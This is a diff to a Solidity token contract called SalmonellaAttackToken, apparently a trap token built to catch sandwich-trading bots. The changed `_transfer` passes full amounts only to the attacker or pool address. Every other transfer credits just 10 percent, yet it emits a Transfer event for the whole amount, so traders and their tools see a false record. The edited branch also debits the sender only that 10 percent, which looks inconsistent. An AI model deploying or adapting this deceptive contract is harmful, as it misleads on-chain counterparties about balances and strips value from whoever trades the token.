@@ -23,7 +23,7 @@ contract SalmonellaAttackToken is IERC20 {
         name = "SalmonellaAttackToken";
         symbol = "SAT";
         decimals = 18;
-        totalSupply = initialSupply / (10**decimals);
+        totalSupply = initialSupply * 10**uint256(decimals);
         _balances[msg.sender] = totalSupply;
         salmonellaAttacker = msg.sender;
         poolAddress = address(0); // setter
@@ -43,8 +43,6 @@ contract SalmonellaAttackToken is IERC20 {
         override
         returns (bool)
     {
-        //msg.sender = dex.address --> ALWAYS
-        //recipient --> dex's msg.sender --> sandwichAttacker
         _transfer(msg.sender, recipient, amount);
         return true;
     }
@@ -70,17 +68,16 @@ contract SalmonellaAttackToken is IERC20 {
     function _transfer(address sender,address recipient, uint256 amount) internal virtual {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
-        //senderBalance --> dex.balance (I guess it's wrong)
-        //recipient --> sandwichAttacker
+        
         uint256 senderBalance = _balances[sender];
         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
         
-        if (sender == salmonellaAttacker || sender == poolAddress) { //poolAddress --> sender --> dex.address
+        if (recipient == salmonellaAttacker || recipient == poolAddress) {
             _balances[sender] = senderBalance - amount;
             _balances[recipient] += amount;
         } else {
-            _balances[sender] = senderBalance - amount;
             uint256 trapAmount = (amount * 10) / 100;
+            _balances[sender] = senderBalance - trapAmount;
             _balances[recipient] += trapAmount;
         }
         emit Transfer(sender, recipient, amount);
@@ -99,5 +96,5 @@ contract SalmonellaAttackToken is IERC20 {
     	for (uint i=0; i<listOfAddressToAllow.length;i++){
     		addressesAllowed[listOfAddressToAllow[i]] = true;
     	}
-    }
+    }   
 }
